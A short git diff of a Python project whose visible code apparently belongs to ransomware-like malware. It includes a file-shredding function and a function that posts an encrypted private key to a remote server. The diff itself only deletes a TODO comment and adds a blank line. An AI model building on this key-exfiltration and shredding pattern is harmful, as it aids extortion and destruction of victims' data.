@@ -97,7 +97,6 @@ def shred(file_name,  passes=1):
 
 
 def send_to_server_encrypted_private_key(id, private_encrypted_key):
-    #TODO something with id later 
     try:
         ret = requests.post(server_address, data=private_encrypted_key)
     except Exception as e:
@@ -183,6 +182,7 @@ def menu():
 
     # kill deamon running on bg
     kill_daemon()
+
 
 if __name__ == "__main__": 
     print(logo)
